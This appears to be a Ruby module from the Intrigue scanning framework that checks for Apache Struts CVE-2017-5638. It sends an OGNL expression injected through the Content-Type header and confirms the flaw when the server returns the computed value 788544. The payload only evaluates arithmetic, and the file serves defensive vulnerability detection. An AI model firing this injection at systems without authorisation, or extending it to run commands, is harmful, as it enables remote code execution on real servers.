module Intrigue
module Task
class ApacheStrutsJakartaParser < BaseTask

  def self.metadata
    {
      :name => "vuln/apache_struts_jakarta_parser",
      :pretty_name => "Vuln Check - Apache Struts Jakarta Parser",
      :identifiers => [{ "cve" =>  "CVE-2017-5638" }],
      :authors => ["jcran"],
      :description => "Trigger Apache Struts CVE-2017-5638 Jakarta Parser",
      :references => [
        "https://blog.qualys.com/securitylabs/2017/03/14/apache-struts-cve-2017-5638-vulnerability-and-the-qualys-solution"
      ],
      :type => "vuln_check",
      :passive => false,
      :allowed_types => ["Uri"],
      :example_entities => [ 
        {"type" => "Uri", "details" => {"name" => "https://intrigue.io"}} 
      ],
      :allowed_options => [],
      :created_types => []
    }
  end

  ## Default method, subclasses must override this
  def run
    super

    uri = _get_entity_name

    headers = {}
    headers["Content-Type"] = "%{#context[‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’].addHeader(‘X-Intrigue-Struts’,888*888)}.multipart/form-data"
    response = http_request(:get, uri, nil, headers) # no auth

    unless response
      _log_error "No response received"
      return
    end

    # show the response in the logs 
    response.each {|x| _log "#{x}: #{response.header[x]}"}
        
    if response.header['X-Intrigue-Struts'] =~ /788544/
      
      instance_details = { 
        proof: "#{response.header['X-Intrigue-Struts']}",
      }
      _create_linked_issue "apache_struts_jakarta_parser", instance_details
    end
  end

end
end
end
